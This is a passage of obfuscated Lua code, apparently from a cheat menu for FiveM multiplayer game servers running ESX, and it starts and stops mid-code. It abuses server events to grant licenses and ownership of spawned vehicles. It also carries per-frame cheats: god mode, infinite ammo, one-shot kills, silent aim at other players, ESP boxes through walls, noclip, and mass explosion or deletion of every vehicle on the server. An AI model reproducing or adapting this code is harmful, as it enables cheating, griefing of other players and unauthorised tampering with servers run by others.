        for i = 0, #IBYYGRD do
            TriggerCustomEvent(
                true,
                "esx_license:addLicense",
                QNhi8vRBtsb3wh0,
                IBYYGRD[i],
                function()
                    cb(true)
                    CahvwB3vGb("Added license " .. IBYYGRD[i])
                end
            )
        end
    else
        CahvwB3vGb("This server doesn't have ~r~esx_license")
    end
end
function BCFF()
    if gzhXdn5rXT132aD["esx_vehicleshop"] then
        local SO3d1FJnlRo = kR3tkcBRzWGoBkSE("Enter Vehicle Spawn Name", "", 10)
        local gnOu = kR3tkcBRzWGoBkSE("Enter Vehicle Plate Number", "", 8)
        if SO3d1FJnlRo and IsModelValid(SO3d1FJnlRo) and IsModelAVehicle(SO3d1FJnlRo) then
            RequestModel(SO3d1FJnlRo)
            while not HasModelLoaded(SO3d1FJnlRo) do
                Citizen.Wait(0)
            end
            local W8dkBot6gilOjblO =
                CreateVehicle(
                GetHashKey(SO3d1FJnlRo),
                GetEntityCoords(PlayerPedId(-1)),
                GetEntityHeading(PlayerPedId(-1)),
                true,
                true
            )
            SetVehicleNumberPlateText(W8dkBot6gilOjblO, gnOu)
            local eL3X3P72kZv4Pr7W = ESX.Game.GetVehicleProperties(W8dkBot6gilOjblO)
            TriggerServerEvent("esx_vehicleshop:setVehicleOwnedPlayerId", eL3X3P72kZv4Pr7W)
            CahvwB3vGb("~g~~h~Success", false)
        else
            CahvwB3vGb("~b~~h~Model is not valid !", true)
        end
    else
        CahvwB3vGb("This server doesn't have ~r~esx_vehicleshop")
    end
end
function AddVectors(t8Mya4vkc7FIKMnFSTDG, hTzuzyY)
    return vector3(
        t8Mya4vkc7FIKMnFSTDG.x + hTzuzyY.x,
        t8Mya4vkc7FIKMnFSTDG.y + hTzuzyY.y,
        t8Mya4vkc7FIKMnFSTDG.z + hTzuzyY.z
    )
end
function SubVectors(pVvGqaRLNHWvXmQg48EP, ukVwkA9Sy2DMFsXZ)
    return vector3(
        pVvGqaRLNHWvXmQg48EP.x - ukVwkA9Sy2DMFsXZ.x,
        pVvGqaRLNHWvXmQg48EP.y - ukVwkA9Sy2DMFsXZ.y,
        pVvGqaRLNHWvXmQg48EP.z - ukVwkA9Sy2DMFsXZ.z
    )
end
function ScaleVector(_WMCQ9lBDoSH7p_Au, icGUK11DQvUKc)
    return vector3(
        _WMCQ9lBDoSH7p_Au.x * icGUK11DQvUKc,
        _WMCQ9lBDoSH7p_Au.y * icGUK11DQvUKc,
        _WMCQ9lBDoSH7p_Au.z * icGUK11DQvUKc
    )
end
function ApplyForce(P2LZ, mURrRrKK)
    ApplyForceToEntity(P2LZ, 3, mURrRrKK, 0, 0, 0, false, false, true, true, false, true)
end
function Oscillate(rOL3Fbeqh6Sot, YXBhXwBVh9cqLnQkzqZsE, EnahBinzkFfnC, TETo8A8)
    local M =
        ScaleVector(SubVectors(YXBhXwBVh9cqLnQkzqZsE, GetEntityCoords(rOL3Fbeqh6Sot)), (EnahBinzkFfnC * EnahBinzkFfnC))
    local Ug =
        AddVectors(
        ScaleVector(GetEntityVelocity(rOL3Fbeqh6Sot), (2.0 * EnahBinzkFfnC * TETo8A8)),
        vector3(0.0, 0.0, 0.1)
    )
    local A3LhcO1OkGmV2 = SubVectors(M, Ug)
    ApplyForce(rOL3Fbeqh6Sot, A3LhcO1OkGmV2)
end
function GetEntityAimedAt(YsFCz1jb3HXalcQ6x6hnn)
    local kZ2IZM, Xm1A6KhI = GetEntityPlayerIsFreeAimingAt(YsFCz1jb3HXalcQ6x6hnn, Citizen.ReturnResultAnyway())
    return Xm1A6KhI
end
local LVlTHmG = false
local vLI8tCR2dlNoyQd5 = false
local p3mYqN1TcwLVndk9iWn = false
local dbrq0OSRs6roe1ORnIx = false
local UeXPZsA1QbtpHNYG9T = false
local kQEUEuibl17Tuc = false
local q0p1IY1Ga4Vi6s5HA = false
local VEW50tBUqyGeO2O = false
Citizen.CreateThread(
    function()
        while MfoUxfed8hjNNy do
            Citizen.Wait(0)
            if LVlTHmG then
                SetPlayerInvincible(PlayerId(), true)
                SetEntityInvincible(PlayerPedId(), true)
            end
            SetEntityVisible(PlayerPedId(), not vLI8tCR2dlNoyQd5, 0)
            if staminaStatus then
                RestorePlayerStamina(PlayerId(-1), 1.0)
            end
            SetPedConfigFlag(PlayerPedId(), 223, tinyStatus)
            if q0p1IY1Ga4Vi6s5HA and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(GetPlayerPed(-1)), true)
            end
            if rainbStatus and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                Citizen.Wait(0)
                local exB7gGYEdiib = Wf(1.0)
                SetVehicleCustomPrimaryColour(
                    GetVehiclePedIsUsing(PlayerPedId(-1)),
                    exB7gGYEdiib.r,
                    exB7gGYEdiib.g,
                    exB7gGYEdiib.b
                )
                SetVehicleCustomSecondaryColour(
                    GetVehiclePedIsUsing(PlayerPedId(-1)),
                    exB7gGYEdiib.r,
                    exB7gGYEdiib.g,
                    exB7gGYEdiib.b
                )
            end
            if rainbBNStatus and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                for i = -1, 12 do
                    Citizen.Wait(0)
                    local vgzUr = Wf(1.0)
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), vgzUr.r, vgzUr.g, vgzUr.b)
                    if i == 12 then
                        i = -1
                    end
                end
            end
            if EMPStatus then
                for PSp in EnumerateVehicles() do
                    if (PSp ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                        NetworkRequestControlOfEntity(PSp)
                        SetVehicleUndriveable(PSp, true)
                        SetVehicleEngineHealth(PSp, 0)
                    end
                end
            end
            if DelNStatus then
                for XtRwlAE6OMS2mG in EnumerateVehicles() do
                    if (XtRwlAE6OMS2mG ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(XtRwlAE6OMS2mG, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(XtRwlAE6OMS2mG, true))
                        SetEntityAsMissionEntity(XtRwlAE6OMS2mG, 1, 1)
                        DeleteEntity(XtRwlAE6OMS2mG)
                    end
                end
            end
            if LaunchStatus then
                for ggrf6xoqCwaH in EnumerateVehicles() do
                    RequestControlOnce(ggrf6xoqCwaH)
                    for i = 0, 1000 do
                        if (NetworkIsPlayerActive(i)) then
                            ApplyForce(ggrf6xoqCwaH, GetEntityCoords(GetPlayerPed(i)))
                        end
                    end
                end
            end
            if ExplodeStatus then
                for fyHNd7tRr in EnumerateVehicles() do
                    if (fyHNd7tRr ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                        NetworkRequestControlOfEntity(fyHNd7tRr)
                        NetworkExplodeVehicle(fyHNd7tRr, true, true, false)
                    end
                end
            end
            if LockVehStatus then
                for AKKC31w0vkqI in EnumerateVehicles() do
                    RequestControlOnce(AKKC31w0vkqI)
                    SetVehicleDoorsLocked(AKKC31w0vkqI, 2)
                end
            end
            if UnlockVehStatus then
                for RKZyteXFG6rkixzMj in EnumerateVehicles() do
                    RequestControlOnce(RKZyteXFG6rkixzMj)
                    SetVehicleDoorsLocked(RKZyteXFG6rkixzMj, 1)
                end
            end
            if VEW50tBUqyGeO2O and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(GetPlayerPed(-1)), 250.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(GetPlayerPed(-1)), 0.0)
                end
            end
            if coordsStatus then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                DrawTxt("~b~X:~s~ " .. roundx, 0.05, 0.00)
                DrawTxt("~b~Y:~s~ " .. roundy, 0.12, 0.00)
                DrawTxt("~b~Z:~s~ " .. roundz, 0.20, 0.00)
            end
            if noreloadStatus then
                SetPedInfiniteAmmoClip(PlayerPedId(), true)
            else
                SetPedInfiniteAmmoClip(PlayerPedId(), false)
            end
            if infammoStatus then
                SetPedInfiniteAmmo(PlayerPedId(), true)
            else
                SetPedInfiniteAmmo(PlayerPedId(), false)
            end
            if explosiveStatus then
                local Pwk48q3NHynbkAI, kgv0u2G8sE_I = GetPedLastWeaponImpactCoord(PlayerPedId())
                if Pwk48q3NHynbkAI then
                    AddExplosion(kgv0u2G8sE_I.x, kgv0u2G8sE_I.y, kgv0u2G8sE_I.z, 2, 100000.0, true, false, 0)
                end
            end
            if oneshotStatus then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local JzI1dMi_Hvu4op1 = GetEntityAimedAt(PlayerId())
                if IsEntityAPed(JzI1dMi_Hvu4op1) then
                    if IsPedInAnyVehicle(JzI1dMi_Hvu4op1, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(JzI1dMi_Hvu4op1, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(JzI1dMi_Hvu4op1, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(JzI1dMi_Hvu4op1) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(JzI1dMi_Hvu4op1, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(JzI1dMi_Hvu4op1, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
            if silentStatus then
                for player = 1, 1000 do
                    if player ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local zStSrf8 = GetPlayerPed(player)
                            local vz_XNRxSSZmJuU = GetEntityCoords(zStSrf8)
                            local CcjzV8TV4aiFk = DoesEntityExist(zStSrf8)
                            local m2I47UQ3 = IsPlayerDead(zStSrf8)
                            local g2to = GetEntityCoords(GetCurrentPedWeaponEntityIndex(PlayerPedId()))
                            local nav = GetGameplayCamCoord() + (GetCamDirFromScreenCenter() * 200)
                            local LHnOiPHabu9fco6612w, VAKf4H5BOXV5B49W59_9o = GetCurrentPedWeapon(PlayerPedId())
                            if CcjzV8TV4aiFk and not m2I47UQ3 then
                                if IsEntityVisible(zStSrf8) and OnScreen then
                                    ShootSingleBulletBetweenCoords(
                                        g2to,
                                        nav,
                                        10,
                                        true,
                                        VAKf4H5BOXV5B49W59_9o,
                                        PlayerPedId(),
                                        true,
                                        true,
                                        54000.0
                                    )
                                end
                            end
                        end
                    end
                end
            end
            if cross1Status then
                ShowHudComponentThisFrame(14)
            end
            if cross2Status then
                DrawTxt("~s~+", 0.495, 0.484)
            end
            if cross3Status then
                DrawTxt("~r~.", 0.4968, 0.477)
            end
            if p3mYqN1TcwLVndk9iWn then
                local gxIWO9cd0g8KxR = 2
                local xPYo5uJ_mIvyfX2Xw4pz =
                    IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                FreezeEntityPosition(PlayerPedId(), true)
                SetEntityInvincible(PlayerPedId(), true)
                local iujMavGfE8M9 = GetEntityCoords(entity)
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 268, true)
                DisableControlAction(0, 31, true)
                DisableControlAction(0, 269, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 266, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 30, true)
                DisableControlAction(0, 267, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 44, true)
                DisableControlAction(0, 20, true)
                local HPNcG8 = 0.0
                local W9m3ExFBw = 0.0
                if IsDisabledControlPressed(0, 32) then
                    HPNcG8 = 0.5
                end
                if IsDisabledControlPressed(0, 33) then
                    HPNcG8 = -0.5
                end
                if IsDisabledControlPressed(0, 34) then
                    SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
                end
                if IsDisabledControlPressed(0, 35) then
                    SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
                end
                if IsDisabledControlPressed(0, 44) then
                    W9m3ExFBw = 0.21
                end
                if IsDisabledControlPressed(0, 20) then
                    W9m3ExFBw = -0.21
                end
                iujMavGfE8M9 =
                    GetOffsetFromEntityInWorldCoords(
                    xPYo5uJ_mIvyfX2Xw4pz,
                    0.0,
                    HPNcG8 * (gxIWO9cd0g8KxR + 0.3),
                    W9m3ExFBw * (gxIWO9cd0g8KxR + 0.3)
                )
                local K0 = GetEntityHeading(xPYo5uJ_mIvyfX2Xw4pz)
                SetEntityVelocity(xPYo5uJ_mIvyfX2Xw4pz, 0.0, 0.0, 0.0)
                SetEntityRotation(xPYo5uJ_mIvyfX2Xw4pz, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(xPYo5uJ_mIvyfX2Xw4pz, K0)
                SetEntityCollision(xPYo5uJ_mIvyfX2Xw4pz, false, false)
                SetEntityCoordsNoOffset(
                    xPYo5uJ_mIvyfX2Xw4pz,
                    iujMavGfE8M9.x,
                    iujMavGfE8M9.y,
                    iujMavGfE8M9.z,
                    true,
                    true,
                    true
                )
                FreezeEntityPosition(xPYo5uJ_mIvyfX2Xw4pz, false)
                SetEntityInvincible(xPYo5uJ_mIvyfX2Xw4pz, false)
                SetEntityCollision(xPYo5uJ_mIvyfX2Xw4pz, true, true)
            end
            local w8HETwoZY8AqXRyx = GetActivePlayers()
            for io = 1, #w8HETwoZY8AqXRyx do
                local yP066pS2iOsgAGYZ = w8HETwoZY8AqXRyx[io]
                local KqqB7sWfMCSr = GetPlayerPed(yP066pS2iOsgAGYZ)
                local GVqS, KwZYdgc, GChxDdq_2mrpPKTQMy = table.unpack(GetEntityCoords(PlayerPedId()))
                local vbTiSbvXRan8, zVzyJYN02ByCR8, VjOO0lmEGlo0PWSttCWM5 = table.unpack(GetEntityCoords(KqqB7sWfMCSr))
                if dbrq0OSRs6roe1ORnIx and GetPlayerPed(yP066pS2iOsgAGYZ) ~= GetPlayerPed(-1) then
                    distance =
                        math.floor(
                        GetDistanceBetweenCoords(
                            GVqS,
                            KwZYdgc,
                            GChxDdq_2mrpPKTQMy,
                            vbTiSbvXRan8,
                            zVzyJYN02ByCR8,
                            VjOO0lmEGlo0PWSttCWM5,
                            true
                        )
                    )
                    if (distance < 150) then
                        if NetworkIsPlayerTalking(yP066pS2iOsgAGYZ) then
                            DrawText3D(
                                vbTiSbvXRan8,
                                zVzyJYN02ByCR8,
                                VjOO0lmEGlo0PWSttCWM5 + 1.2,
                                GetPlayerServerId(yP066pS2iOsgAGYZ) .. "  |  " .. GetPlayerName(yP066pS2iOsgAGYZ),
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3]
                            )
                        else
                            DrawText3D(
                                vbTiSbvXRan8,
                                zVzyJYN02ByCR8,
                                VjOO0lmEGlo0PWSttCWM5 + 1.2,
                                GetPlayerServerId(yP066pS2iOsgAGYZ) .. "  |  " .. GetPlayerName(yP066pS2iOsgAGYZ),
                                255,
                                255,
                                255
                            )
                        end
                    end
                end
                if UeXPZsA1QbtpHNYG9T then
                    if gqe9DjALh7ATnUs7e then
                        if KqqB7sWfMCSr ~= GetPlayerPed(-1) then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                hcmnFj7ddqmbgXI5lN[1],
                                hcmnFj7ddqmbgXI5lN[2],
                                hcmnFj7ddqmbgXI5lN[3],
                                255
                            )
                        end
                    else
                        LineOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                        LineOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, -0.9)
                        LineFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, 0.8)
                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, 0.8)
                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, 0.3, -0.9)
                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, 0.8)
                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, 0.3, -0.9)
                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, 0.8)
                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, -0.3, -0.3, -0.9)
                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, 0.8)
                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(KqqB7sWfMCSr, 0.3, -0.3, -0.9)
                        DrawLine(
                            LineOneBegin.x,
                            LineOneBegin.y,
                            LineOneBegin.z,
                            LineOneEnd.x,
                            LineOneEnd.y,
                            LineOneEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            LineTwoBegin.x,
                            LineTwoBegin.y,
                            LineTwoBegin.z,
                            LineTwoEnd.x,
                            LineTwoEnd.y,
                            LineTwoEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            LineThreeBegin.x,
                            LineThreeBegin.y,
                            LineThreeBegin.z,
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            LineFourBegin.x,
                            LineFourBegin.y,
                            LineFourBegin.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            TLineOneBegin.x,
                            TLineOneBegin.y,
                            TLineOneBegin.z,
                            TLineOneEnd.x,
                            TLineOneEnd.y,
                            TLineOneEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            TLineTwoBegin.x,
                            TLineTwoBegin.y,
                            TLineTwoBegin.z,
                            TLineTwoEnd.x,
                            TLineTwoEnd.y,
                            TLineTwoEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            TLineThreeBegin.x,
                            TLineThreeBegin.y,
                            TLineThreeBegin.z,
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            TLineFourBegin.x,
                            TLineFourBegin.y,
                            TLineFourBegin.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            ConnectorOneBegin.x,
                            ConnectorOneBegin.y,
                            ConnectorOneBegin.z,
                            ConnectorOneEnd.x,
                            ConnectorOneEnd.y,
                            ConnectorOneEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            ConnectorTwoBegin.x,
                            ConnectorTwoBegin.y,
                            ConnectorTwoBegin.z,
                            ConnectorTwoEnd.x,
                            ConnectorTwoEnd.y,
                            ConnectorTwoEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            ConnectorThreeBegin.x,
                            ConnectorThreeBegin.y,
                            ConnectorThreeBegin.z,
                            ConnectorThreeEnd.x,
                            ConnectorThreeEnd.y,
                            ConnectorThreeEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                        DrawLine(
                            ConnectorFourBegin.x,
                            ConnectorFourBegin.y,
                            ConnectorFourBegin.z,
                            ConnectorFourEnd.x,
                            ConnectorFourEnd.y,
                            ConnectorFourEnd.z,
                            hcmnFj7ddqmbgXI5lN[1],
                            hcmnFj7ddqmbgXI5lN[2],
                            hcmnFj7ddqmbgXI5lN[3],
                            255
                        )
                    end
                end
                if kQEUEuibl17Tuc then
                    DrawLine(
                        GVqS,
                        KwZYdgc,
                        GChxDdq_2mrpPKTQMy,
                        vbTiSbvXRan8,
                        zVzyJYN02ByCR8,
                        VjOO0lmEGlo0PWSttCWM5,
                        hcmnFj7ddqmbgXI5lN[1],
                        hcmnFj7ddqmbgXI5lN[2],
